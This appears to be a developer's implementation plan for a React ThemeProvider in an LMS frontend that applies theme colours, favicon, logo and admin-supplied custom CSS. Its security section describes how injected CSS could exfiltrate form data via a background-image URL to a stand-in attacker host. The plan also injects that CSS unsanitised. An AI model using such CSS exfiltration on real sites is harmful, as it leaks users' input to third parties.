Create a `ThemeProvider` component that fetches the active theme from `GET /themes/active` and injects CSS custom properties onto `document.documentElement`. Also handles dynamic logo, favicon, and custom CSS injection.

## Key Insights

- `Providers` component in `components/providers.tsx` wraps the entire app -- add `ThemeProvider` here
- `globals.css` defines CSS variables in `:root` (e.g. `--primary`, `--background`) -- theme overrides these
- shadcn/ui components already consume these CSS variables -- changing them cascades everywhere
- Favicon can be set dynamically via `document.querySelector('link[rel="icon"]')`
- Use `useQuery` with `staleTime: Infinity` and `refetchOnWindowFocus: false` for minimal API calls
- No auth needed for `/themes/active` -- works for unauthenticated visitors too

## Requirements

- `ThemeProvider` component fetches active theme on mount
- Applies theme colors as CSS custom properties on `:root`
- Injects `customCss` via a `<style>` tag
- Updates favicon dynamically if `faviconUrl` is set
- Exposes theme data (logoUrl, name) via React context for components that need it
- Graceful fallback: if API fails or no active theme, use defaults from `globals.css`

## Architecture

```
frontend/
  components/
    theme-provider.tsx    -- ThemeProvider component + useTheme hook
  components/
    providers.tsx         -- Add ThemeProvider inside QueryClientProvider
```

### CSS Variable Mapping

| Theme Field | CSS Variable | Used By |
|-------------|-------------|---------|
| primaryColor | --primary | shadcn buttons, links |
| primaryForeground | --primary-foreground | Text on primary bg |
| secondaryColor | --secondary | Secondary buttons |
| accentColor | --accent | Accent highlights |
| backgroundColor | --background | Page background |
| textColor | --foreground | Body text |
| borderColor | --border | Borders, dividers |

Note: Theme colors are hex strings. shadcn/ui uses oklch in `globals.css`. The ThemeProvider will need to convert hex to oklch or override at a higher specificity. **Simplest approach**: set colors as hex and override via `style` attribute on `<html>` element, which takes precedence.

## Related Code Files

- `/home/trung/workspace/project/private/tiny-lms/frontend/components/providers.tsx`
- `/home/trung/workspace/project/private/tiny-lms/frontend/app/layout.tsx`
- `/home/trung/workspace/project/private/tiny-lms/frontend/app/globals.css`

## Implementation Steps

### 1. Create ThemeProvider (`components/theme-provider.tsx`)

```typescript
'use client';

import { createContext, useContext, useEffect } from 'react';
import { useQuery } from '@tanstack/react-query';
import { themesApi } from '@/lib/api';
import { queryKeys } from '@/lib/query-keys';

interface ThemeData {
  name: string;
  logoUrl?: string;
  faviconUrl?: string;
  // ... all color fields
}

const ThemeContext = createContext<ThemeData | null>(null);

export function useTheme() {
  return useContext(ThemeContext);
}

export function ThemeProvider({ children }: { children: React.ReactNode }) {
  const { data: theme } = useQuery({
    queryKey: queryKeys.themes.active(),
    queryFn: () => themesApi.getActive(),
    staleTime: 5 * 60 * 1000, // 5 min
    refetchOnWindowFocus: false,
  });

  useEffect(() => {
    if (!theme) return;
    const root = document.documentElement;

    // Apply color variables
    if (theme.primaryColor) root.style.setProperty('--primary', theme.primaryColor);
    if (theme.backgroundColor) root.style.setProperty('--background', theme.backgroundColor);
    if (theme.textColor) root.style.setProperty('--foreground', theme.textColor);
    // ... map all fields

    // Favicon
    if (theme.faviconUrl) {
      let link = document.querySelector<HTMLLinkElement>('link[rel="icon"]');
      if (!link) {
        link = document.createElement('link');
        link.rel = 'icon';
        document.head.appendChild(link);
      }
      link.href = theme.faviconUrl;
    }

    // Custom CSS
    if (theme.customCss) {
      let style = document.getElementById('theme-custom-css');
      if (!style) {
        style = document.createElement('style');
        style.id = 'theme-custom-css';
        document.head.appendChild(style);
      }
      style.textContent = theme.customCss;
    }

    // Font family
    if (theme.fontFamily) {
      root.style.setProperty('--font-sans', theme.fontFamily);
    }

    // Cleanup on unmount
    return () => {
      root.style.removeProperty('--primary');
      // ... remove all
    };
  }, [theme]);

  return (
    <ThemeContext.Provider value={theme || null}>
      {children}
    </ThemeContext.Provider>
  );
}
```

### 2. Update Providers

```typescript
export function Providers({ children }: { children: React.ReactNode }) {
  return (
    <QueryClientProvider client={queryClient}>
      <ThemeProvider>
        {children}
      </ThemeProvider>
    </QueryClientProvider>
  );
}
```

### 3. Use logoUrl in headers

Update `PublicHeader`, `DashboardHeader` to consume `useTheme()` and display `theme.logoUrl` if available, falling back to text "Tiny LMS".

### 4. Handle color format

**Option A (simple)**: Override CSS variables directly with hex values. This works because CSS properties accept hex. The oklch defaults in `globals.css` get overridden by the inline style on `<html>`.

**Option B (advanced)**: Convert hex to oklch. Only needed if dark mode toggle needs oklch math. Start with Option A.

## Todo

- [ ] Create `components/theme-provider.tsx` with ThemeContext + useTheme
- [ ] Fetch active theme via useQuery (public endpoint, no auth)
- [ ] Apply CSS variables on `:root` via `useEffect`
- [ ] Inject custom CSS via `<style>` tag
- [ ] Update favicon dynamically
- [ ] Wrap in Providers component
- [ ] Update PublicHeader and DashboardHeader to use `useTheme()` for logo
- [ ] Test with no active theme (graceful fallback)
- [ ] Test with custom theme colors

## Success Criteria

- Active theme colors apply globally on page load
- shadcn/ui components reflect theme colors (buttons, cards, etc.)
- Logo displays from theme if set
- Favicon updates dynamically
- Custom CSS is injected
- No flash of unstyled content (FOUC) -- acceptable brief flash on first load
- App works normally when no active theme exists (defaults apply)

## Risk Assessment

- **Medium**: oklch vs hex mismatch -- hex override on `:root` style attribute should work but needs testing with shadcn components
- **Low**: FOUC on initial load -- mitigated by short staleTime and fast API
- **Low**: Custom CSS injection -- CSS cannot execute scripts, but could break layout if admin enters bad CSS

## Security Considerations

- `customCss` is injected as-is. CSS cannot execute JavaScript, but could:
  - Hide UI elements (`display: none`)
  - Overlay content (`position: fixed; z-index: 9999`)
  - Exfiltrate data via `background-image: url(attacker.com?data=...)` on form inputs
- Mitigation: only admins can set customCss; add a warning in the UI
- `logoUrl` and `faviconUrl` are rendered as `src` attributes -- standard XSS protections apply (Next.js/React escapes)

## Next Steps

- Consider adding theme preview mode (preview without activating)
- Consider server-side theme injection to eliminate FOUC completely
- Consider dark mode variants per theme
